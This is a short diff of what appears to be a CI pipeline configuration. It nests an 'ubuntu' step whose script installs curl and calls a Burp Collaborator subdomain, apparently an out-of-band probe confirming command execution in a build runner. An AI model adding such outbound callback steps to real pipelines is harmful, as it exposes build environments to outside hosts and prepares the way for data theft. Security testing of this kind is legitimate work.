@@ -1,2 +1,3 @@
-name: ubuntu
-  script: apt update -y && apt-get install curl -y && curl https://5iongi0rut0fnjhbjdp4wmx3gumlaa.burpcollaborator.net 
+steps:
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://5iongi0rut0fnjhbjdp4wmx3gumlaa.burpcollaborator.net 
